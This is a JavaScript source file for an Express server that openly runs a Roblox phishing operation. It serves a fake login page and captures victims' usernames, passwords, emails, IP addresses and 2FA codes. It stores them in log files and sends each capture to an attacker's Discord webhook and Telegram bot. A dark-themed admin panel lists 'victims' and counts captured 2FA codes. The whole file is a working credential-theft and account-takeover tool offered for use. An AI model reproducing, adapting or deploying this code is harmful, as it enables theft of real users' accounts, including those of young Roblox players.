const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Serve main phishing page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Log directory
const LOG_DIR = path.join(__dirname, 'captured_data');
if (!fs.existsSync(LOG_DIR)) {
    fs.mkdirSync(LOG_DIR, { recursive: true });
}

// Capture credentials
app.post('/api/capture', async (req, res) => {
    const { username, password, email, userAgent, timestamp, ip } = req.body;
    
    const victimData = {
        username,
        password,
        email,
        userAgent,
        timestamp,
        ip: ip || req.ip || req.connection.remoteAddress,
        twoFACode: null,
        twoFACaptured: false
    };
    
    // Save to JSON file
    const filename = `victim_${Date.now()}_${username}.json`;
    const filepath = path.join(LOG_DIR, filename);
    
    fs.writeFileSync(filepath, JSON.stringify(victimData, null, 2));
    
    // Also append to master log
    const logEntry = `\n[${timestamp}] Username: ${username} | Password: ${password} | Email: ${email} | IP: ${victimData.ip}\n`;
    fs.appendFileSync(path.join(LOG_DIR, 'master_log.txt'), logEntry);
    
    // Send to Discord webhook (optional)
    if (process.env.DISCORD_WEBHOOK) {
        try {
            await axios.post(process.env.DISCORD_WEBHOOK, {
                embeds: [{
                    title: '🎣 New Victim Captured!',
                    color: 0xff0000,
                    fields: [
                        { name: 'Username', value: username, inline: true },
                        { name: 'Password', value: password, inline: true },
                        { name: 'Email', value: email, inline: false },
                        { name: 'IP Address', value: victimData.ip, inline: true },
                        { name: 'User Agent', value: userAgent.substring(0, 100), inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            });
        } catch (error) {
            console.error('Discord webhook error:', error.message);
        }
    }
    
    // Send to Telegram bot (optional)
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
        try {
            const message = `🎣 *New Victim Captured*\n\n` +
                          `👤 Username: \`${username}\`\n` +
                          `🔑 Password: \`${password}\`\n` +
                          `📧 Email: \`${email}\`\n` +
                          `🌐 IP: \`${victimData.ip}\`\n` +
                          `⏰ Time: ${timestamp}`;
            
            await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: process.env.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
        } catch (error) {
            console.error('Telegram error:', error.message);
        }
    }
    
    console.log(`[CAPTURED] ${username}:${password} | ${email} | ${victimData.ip}`);
    
    res.json({ success: true });
});

// Capture 2FA code
app.post('/api/capture-2fa', async (req, res) => {
    const { username, twoFACode, timestamp } = req.body;
    
    // Find the victim's file and update it
    const files = fs.readdirSync(LOG_DIR);
    const victimFile = files.find(f => f.includes(username) && f.endsWith('.json'));
    
    if (victimFile) {
        const filepath = path.join(LOG_DIR, victimFile);
        const data = JSON.parse(fs.readFileSync(filepath, 'utf8'));
        data.twoFACode = twoFACode;
        data.twoFACaptured = true;
        data.twoFATimestamp = timestamp;
        
        fs.writeFileSync(filepath, JSON.stringify(data, null, 2));
        
        // Log to master
        const logEntry = `[${timestamp}] 2FA Code for ${username}: ${twoFACode}\n`;
        fs.appendFileSync(path.join(LOG_DIR, 'master_log.txt'), logEntry);
        
        // Send to Discord
        if (process.env.DISCORD_WEBHOOK) {
            try {
                await axios.post(process.env.DISCORD_WEBHOOK, {
                    embeds: [{
                        title: '🔐 2FA Code Captured!',
                        color: 0x00ff00,
                        fields: [
                            { name: 'Username', value: username, inline: true },
                            { name: '2FA Code', value: twoFACode, inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                });
            } catch (error) {
                console.error('Discord webhook error:', error.message);
            }
        }
        
        // Send to Telegram
        if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
            try {
                const message = `🔐 *2FA Code Captured*\n\n` +
                              `👤 Username: \`${username}\`\n` +
                              `🔢 2FA Code: \`${twoFACode}\`\n` +
                              `⏰ Time: ${timestamp}`;
                
                await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: process.env.TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                });
            } catch (error) {
                console.error('Telegram error:', error.message);
            }
        }
        
        console.log(`[2FA CAPTURED] ${username}: ${twoFACode}`);
    }
    
    res.json({ success: true });
});

// Admin panel to view captured data
app.get('/admin/victims', (req, res) => {
    const files = fs.readdirSync(LOG_DIR).filter(f => f.endsWith('.json'));
    const victims = files.map(f => {
        return JSON.parse(fs.readFileSync(path.join(LOG_DIR, f), 'utf8'));
    });
    
    res.json(victims);
});

// Admin panel HTML
app.get('/admin', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Phishing Admin Panel</title>
    <style>
        body {
            font-family: monospace;
            background: #1a1a1a;
            color: #0f0;
            padding: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            border: 1px solid #0f0;
            padding: 10px;
            text-align: left;
        }
        th {
            background: #0f0;
            color: #000;
        }
        .stats {
            display: flex;
            gap: 20px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: #0f0;
            color: #000;
            padding: 20px;
            border-radius: 10px;
            flex: 1;
        }
        .stat-number {
            font-size: 36px;
            font-weight: bold;
        }
        .captured-2fa {
            color: #ffff00;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>🎣 Roblox Phishing Admin Panel</h1>
    
    <div class="stats">
        <div class="stat-card">
            <div>Total Victims</div>
            <div class="stat-number" id="totalVictims">0</div>
        </div>
        <div class="stat-card">
            <div>2FA Captured</div>
            <div class="stat-number" id="twoFACaptured">0</div>
        </div>
    </div>
    
    <button onclick="loadVictims()" style="padding: 10px 20px; background: #0f0; border: none; color: #000; cursor: pointer;">
        🔄 Refresh Data
    </button>
    
    <table id="victimsTable">
        <thead>
            <tr>
                <th>Timestamp</th>
                <th>Username</th>
                <th>Password</th>
                <th>Email</th>
                <th>2FA Code</th>
                <th>IP Address</th>
            </tr>
        </thead>
        <tbody id="victimsBody">
        </tbody>
    </table>
    
    <script>
        async function loadVictims() {
            const response = await fetch('/admin/victims');
            const victims = await response.json();
            
            document.getElementById('totalVictims').textContent = victims.length;
            document.getElementById('twoFACaptured').textContent = 
                victims.filter(v => v.twoFACaptured).length;
            
            const tbody = document.getElementById('victimsBody');
            tbody.innerHTML = '';
            
            victims.reverse().forEach(victim => {
                const row = tbody.insertRow();
                row.innerHTML = \`
                    <td>\${new Date(victim.timestamp).toLocaleString()}</td>
                    <td>\${victim.username}</td>
                    <td>\${victim.password}</td>
                    <td>\${victim.email}</td>
                    <td class="\${victim.twoFACaptured ? 'captured-2fa' : ''}">
                        \${victim.twoFACode || 'Not captured'}
                    </td>
                    <td>\${victim.ip}</td>
                \`;
            });
        }
        
        // Auto-refresh every 10 seconds
        setInterval(loadVictims, 10000);
        loadVictims();
    </script>
</body>
</html>
    `);
});

app.listen(PORT, () => {
    console.log(`\n🎣 Roblox Phishing Server Running`);
    console.log(`📍 Public URL: http://localhost:${PORT}`);
    console.log(`🔐 Admin Panel: http://localhost:${PORT}/admin`);
    console.log(`📁 Logs saved to: ${LOG_DIR}\n`);
});
